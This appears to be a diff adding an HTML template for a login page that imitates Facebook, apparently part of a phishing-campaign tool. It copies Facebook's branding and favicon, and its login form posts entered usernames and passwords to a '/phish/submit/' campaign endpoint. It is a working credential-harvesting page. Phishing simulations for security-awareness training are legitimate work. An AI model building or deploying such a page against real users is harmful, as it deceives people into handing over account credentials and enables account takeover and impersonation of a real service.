@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background: linear-gradient(white, #D3D8E8);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .container {
+            max-width: 980px;
+            width: 100%;
+            padding: 0 20px;
+        }
+        
+        .main-content {
+            display: flex;
+            align-items: center;
+            gap: 50px;
+        }
+        
+        .left-side {
+            flex: 1;
+            padding-right: 32px;
+        }
+        
+        .facebook-logo {
+            font-size: 56px;
+            font-weight: bold;
+            color: #1877f2;
+            margin-bottom: 16px;
+            font-family: 'Klavika Regular', Helvetica, Arial, sans-serif;
+        }
+        
+        .tagline {
+            font-size: 28px;
+            font-weight: normal;
+            line-height: 32px;
+            width: 500px;
+        }
+        
+        .right-side {
+            flex: 1;
+            max-width: 396px;
+        }
+        
+        .login-card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 20px;
+            margin-bottom: 28px;
+        }
+        
+        .login-form input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 17px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            margin-bottom: 12px;
+            background: #f5f6f7;
+        }
+        
+        .login-form input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        
+        .login-btn {
+            width: 100%;
+            background: #1877f2;
+            color: white;
+            border: none;
+            padding: 12px;
+            font-size: 20px;
+            font-weight: bold;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-bottom: 16px;
+        }
+        
+        .login-btn:hover {
+            background: #166fe5;
+        }
+        
+        .forgot-password {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+        
+        .divider {
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        
+        .create-account {
+            text-align: center;
+        }
+        
+        .create-btn {
+            background: #42b883;
+            color: white;
+            border: none;
+            padding: 12px 16px;
+            font-size: 17px;
+            font-weight: bold;
+            border-radius: 6px;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+        }
+        
+        .create-btn:hover {
+            background: #36a370;
+        }
+        
+        .create-page {
+            text-align: center;
+            margin-top: 28px;
+        }
+        
+        .create-page a {
+            color: #1c1e21;
+            font-size: 14px;
+            font-weight: bold;
+            text-decoration: none;
+        }
+        
+        .create-page a:hover {
+            text-decoration: underline;
+        }
+        
+        @media (max-width: 768px) {
+            .main-content {
+                flex-direction: column;
+                gap: 20px;
+            }
+            
+            .left-side {
+                text-align: center;
+                padding-right: 0;
+            }
+            
+            .tagline {
+                width: 100%;
+                font-size: 24px;
+            }
+            
+            .facebook-logo {
+                font-size: 48px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="main-content">
+            <div class="left-side">
+                <div class="facebook-logo">facebook</div>
+                <div class="tagline">
+                    Facebook helps you connect and share with the people in your life.
+                </div>
+            </div>
+            
+            <div class="right-side">
+                <div class="login-card">
+                    <form class="login-form" method="POST" action="/phish/submit/{{ campaign.id if campaign else '' }}">
+                        <input type="text" name="username" placeholder="Email address or phone number" required>
+                        <input type="password" name="password" placeholder="Password" required>
+                        <button type="submit" class="login-btn">Log In</button>
+                    </form>
+                    
+                    <div class="forgot-password">
+                        <a href="#">Forgotten password?</a>
+                    </div>
+                    
+                    <div class="divider"></div>
+                    
+                    <div class="create-account">
+                        <a href="#" class="create-btn">Create New Account</a>
+                    </div>
+                </div>
+                
+                <div class="create-page">
+                    <a href="#"><strong>Create a Page</strong></a> for a celebrity, brand or business.
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Basic form validation and tracking
+        document.querySelector('.login-form').addEventListener('submit', function(e) {
+            const username = document.querySelector('input[name="username"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+            
+            if (!username || !password) {
+                e.preventDefault();
+                alert('Please fill in all fields.');
+                return false;
+            }
+            
+            // Track form submission
+            console.log('Form submitted');
+        });
+        
+        // Add subtle animations
+        document.addEventListener('DOMContentLoaded', function() {
+            const inputs = document.querySelectorAll('input');
+            inputs.forEach(input => {
+                input.addEventListener('focus', function() {
+                    this.style.transform = 'scale(1.02)';
+                    this.style.transition = 'transform 0.2s ease';
+                });
+                
+                input.addEventListener('blur', function() {
+                    this.style.transform = 'scale(1)';
+                });
+            });
+        });
+    </script>
+</body>
+</html>
